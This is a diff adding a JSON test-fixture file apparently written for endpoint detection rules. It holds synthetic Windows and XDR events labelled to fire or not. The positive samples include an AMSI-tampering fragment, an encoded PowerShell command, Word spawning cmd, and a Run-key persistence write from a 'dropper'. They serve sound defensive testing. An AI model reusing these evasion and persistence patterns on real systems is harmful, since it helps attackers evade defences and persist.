+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 7,
+            "Data": {
+              "TaskName": "\\Clean",
+              "SubjectUserName": "admin",
+              "TaskContent": "<Task><Actions><Exec><Command>C:\\Windows\\System32\\cleanmgr.exe</Command></Exec></Actions></Task>"
+            }
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-EVT-005": [
+      {
+        "name": "member added to Administrators fires",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4732,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 8,
+            "Data": {
+              "MemberName": "-",
+              "MemberSid": "S-1-5-21-1111111111-2222222222-3333333333-1005",
+              "TargetUserName": "Administrators",
+              "TargetSid": "S-1-5-32-544",
+              "SubjectUserName": "labuser"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "member added to another group does not fire",
+        "items": [
+          {
+            "Channel": "Security",
+            "EventId": 4732,
+            "TimeCreated": "2026-10-16T09:04:00.000Z",
+            "Provider": "Microsoft-Windows-Security-Auditing",
+            "Computer": "WS-LAB-03",
+            "RecordId": 9,
+            "Data": {
+              "MemberName": "-",
+              "MemberSid": "S-1-5-21-1111111111-2222222222-3333333333-1005",
+              "TargetUserName": "Users",
+              "TargetSid": "S-1-5-32-545",
+              "SubjectUserName": "admin"
+            }
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-EVT-006": [
+      {
+        "name": "AMSI tampering string fires",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "EventId": 4104,
+            "TimeCreated": "2026-10-16T09:05:00.000Z",
+            "Provider": "Microsoft-Windows-PowerShell",
+            "Computer": "WS-LAB-03",
+            "RecordId": 9001,
+            "Data": {
+              "MessageNumber": "1",
+              "MessageTotal": "1",
+              "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+              "ScriptBlockId": "00000000-0000-0000-0000-000000000001",
+              "Path": ""
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "ordinary script block does not fire",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "EventId": 4104,
+            "TimeCreated": "2026-10-16T09:05:00.000Z",
+            "Provider": "Microsoft-Windows-PowerShell",
+            "Computer": "WS-LAB-03",
+            "RecordId": 9002,
+            "Data": {
+              "MessageNumber": "1",
+              "MessageTotal": "1",
+              "ScriptBlockText": "Get-ChildItem C:\\Scripts | Sort-Object Name",
+              "ScriptBlockId": "00000000-0000-0000-0000-000000000002",
+              "Path": ""
+            }
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-EVT-007": [
+      {
+        "name": "encoded command fires",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventId": 1,
+            "TimeCreated": "2026-10-16T09:06:00.000Z",
+            "Provider": "Microsoft-Windows-Sysmon",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5000,
+            "Data": {
+              "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "CommandLine": "powershell.exe -NoP -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+              "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+              "User": "WS-LAB-03\\labuser",
+              "ProcessGuid": "{11111111-1111-1111-1111-111111111111}",
+              "ImageName": "powershell.exe",
+              "ParentImageName": "cmd.exe"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "benign command does not fire",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventId": 1,
+            "TimeCreated": "2026-10-16T09:06:00.000Z",
+            "Provider": "Microsoft-Windows-Sysmon",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5000,
+            "Data": {
+              "Image": "C:\\Windows\\System32\\notepad.exe",
+              "CommandLine": "notepad.exe a.txt",
+              "ParentImage": "C:\\Windows\\explorer.exe",
+              "User": "WS-LAB-03\\labuser",
+              "ProcessGuid": "{22222222-2222-2222-2222-222222222222}",
+              "ImageName": "notepad.exe",
+              "ParentImageName": "explorer.exe"
+            }
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "other Sysmon event does not fire",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventId": 3,
+            "TimeCreated": "2026-10-16T09:06:00.000Z",
+            "Provider": "Microsoft-Windows-Sysmon",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5000,
+            "Data": {
+              "Image": "C:\\Windows\\System32\\notepad.exe",
+              "CommandLine": "powershell -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+              "ImageName": "notepad.exe"
+            }
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-EVT-008": [
+      {
+        "name": "Word to cmd fires",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventId": 1,
+            "TimeCreated": "2026-10-16T09:06:00.000Z",
+            "Provider": "Microsoft-Windows-Sysmon",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5000,
+            "Data": {
+              "Image": "C:\\Windows\\System32\\cmd.exe",
+              "CommandLine": "cmd.exe /c whoami",
+              "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+              "User": "WS-LAB-03\\labuser",
+              "ProcessGuid": "{33333333-3333-3333-3333-333333333333}",
+              "ImageName": "cmd.exe",
+              "ParentImageName": "WINWORD.EXE"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Explorer to cmd does not fire",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventId": 1,
+            "TimeCreated": "2026-10-16T09:06:00.000Z",
+            "Provider": "Microsoft-Windows-Sysmon",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5000,
+            "Data": {
+              "Image": "C:\\Windows\\System32\\cmd.exe",
+              "CommandLine": "cmd.exe",
+              "ParentImage": "C:\\Windows\\explorer.exe",
+              "User": "WS-LAB-03\\labuser",
+              "ProcessGuid": "{44444444-4444-4444-4444-444444444444}",
+              "ImageName": "cmd.exe",
+              "ParentImageName": "explorer.exe"
+            }
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-EVT-009": [
+      {
+        "name": "Run value to AppData fires",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventId": 13,
+            "TimeCreated": "2026-10-16T09:07:00.000Z",
+            "Provider": "Microsoft-Windows-Sysmon",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5000,
+            "Data": {
+              "EventType": "SetValue",
+              "Image": "C:\\Users\\labuser\\AppData\\Local\\Temp\\dropper.exe",
+              "TargetObject": "HKU\\S-1-5-21-1\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+              "Details": "C:\\Users\\labuser\\AppData\\Roaming\\u.exe",
+              "User": "WS-LAB-03\\labuser",
+              "ImageName": "dropper.exe"
+            }
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Run value to Program Files does not fire",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventId": 13,
+            "TimeCreated": "2026-10-16T09:07:00.000Z",
+            "Provider": "Microsoft-Windows-Sysmon",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5000,
+            "Data": {
+              "EventType": "SetValue",
+              "Image": "C:\\Program Files\\Vendor\\setup.exe",
+              "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Vendor",
+              "Details": "C:\\Program Files\\Vendor\\v.exe",
+              "User": "SYSTEM",
+              "ImageName": "setup.exe"
+            }
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "value in another key does not fire",
+        "items": [
+          {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "EventId": 13,
+            "TimeCreated": "2026-10-16T09:07:00.000Z",
+            "Provider": "Microsoft-Windows-Sysmon",
+            "Computer": "WS-LAB-03",
+            "RecordId": 5000,
+            "Data": {
+              "EventType": "SetValue",
+              "Image": "C:\\Users\\labuser\\AppData\\Local\\Temp\\x.exe",
+              "TargetObject": "HKU\\S-1-5-21-1\\SOFTWARE\\Vendor\\Settings\\Path",
+              "Details": "C:\\Users\\labuser\\AppData\\Roaming\\u.exe",
+              "User": "x",
+              "ImageName": "x.exe"
+            }
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-XDR-001": [
+      {
+        "name": "encoded event fires",
+        "items": [
+          {
+            "RecordType": "Event",
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "DeviceName": "WS-LAB-03",
+            "ActionType": "ProcessCreated",
+            "FileName": "powershell.exe",
+            "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+            "ProcessCommandLine": "powershell.exe -NoP -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "InitiatingProcessFileName": "cmd.exe",
+            "InitiatingProcessCommandLine": null,
+            "AccountName": null,
+            "SHA256": null,
+            "AlertId": null,
+            "Title": null,
+            "Severity": null,
+            "Category": null
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "benign event does not fire",
+        "items": [
+          {
+            "RecordType": "Event",
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "DeviceName": "WS-LAB-03",
+            "ActionType": "ProcessCreated",
+            "FileName": "notepad.exe",
+            "FolderPath": null,
+            "ProcessCommandLine": "notepad.exe a.txt",
+            "InitiatingProcessFileName": null,
+            "InitiatingProcessCommandLine": null,
+            "AccountName": null,
+            "SHA256": null,
+            "AlertId": null,
+            "Title": null,
+            "Severity": null,
+            "Category": null
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "alert rows are not evaluated by the event rule",
+        "items": [
+          {
+            "RecordType": "Alert",
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "DeviceName": "WS-LAB-03",
+            "ActionType": "ProcessCreated",
+            "FileName": null,
+            "FolderPath": null,
+            "ProcessCommandLine": "powershell.exe -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "InitiatingProcessFileName": null,
+            "InitiatingProcessCommandLine": null,
+            "AccountName": null,
+            "SHA256": null,
+            "AlertId": null,
+            "Title": "Test",
+            "Severity": "High",
+            "Category": null
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-XDR-002": [
+      {
+        "name": "High alert fires",
+        "items": [
+          {
+            "RecordType": "Alert",
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "DeviceName": "WS-LAB-03",
+            "ActionType": "Alert",
+            "FileName": null,
+            "FolderPath": null,
+            "ProcessCommandLine": null,
+            "InitiatingProcessFileName": null,
+            "InitiatingProcessCommandLine": null,
+            "AccountName": null,
+            "SHA256": null,
+            "AlertId": "da637000000000000000_1",
+            "Title": "Suspicious PowerShell command line",
+            "Severity": "High",
+            "Category": "Execution"
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Medium alert does not fire",
+        "items": [
+          {
+            "RecordType": "Alert",
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "DeviceName": "WS-LAB-03",
+            "ActionType": "Alert",
+            "FileName": null,
+            "FolderPath": null,
+            "ProcessCommandLine": null,
+            "InitiatingProcessFileName": null,
+            "InitiatingProcessCommandLine": null,
+            "AccountName": null,
+            "SHA256": null,
+            "AlertId": "da637000000000000000_2",
+            "Title": "Unusual process",
+            "Severity": "Medium",
+            "Category": null
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-XDR-003": [
+      {
+        "name": "Medium alert fires",
+        "items": [
+          {
+            "RecordType": "Alert",
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "DeviceName": "WS-LAB-03",
+            "ActionType": "Alert",
+            "FileName": null,
+            "FolderPath": null,
+            "ProcessCommandLine": null,
+            "InitiatingProcessFileName": null,
+            "InitiatingProcessCommandLine": null,
+            "AccountName": null,
+            "SHA256": null,
+            "AlertId": "da637000000000000000_2",
+            "Title": "Unusual process",
+            "Severity": "Medium",
+            "Category": null
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "High alert does not fire",
+        "items": [
+          {
+            "RecordType": "Alert",
+            "TimeCreated": "2026-10-16T09:00:00.000Z",
+            "DeviceName": "WS-LAB-03",
+            "ActionType": "Alert",
+            "FileName": null,
+            "FolderPath": null,
+            "ProcessCommandLine": null,
+            "InitiatingProcessFileName": null,
+            "InitiatingProcessCommandLine": null,
+            "AccountName": null,
+            "SHA256": null,
+            "AlertId": "da637000000000000000_1",
+            "Title": "Suspicious PowerShell command line",
+            "Severity": "High",
+            "Category": null
+          }
+        ],
+        "expect": 0
+      }
+    ]
+  }
+}
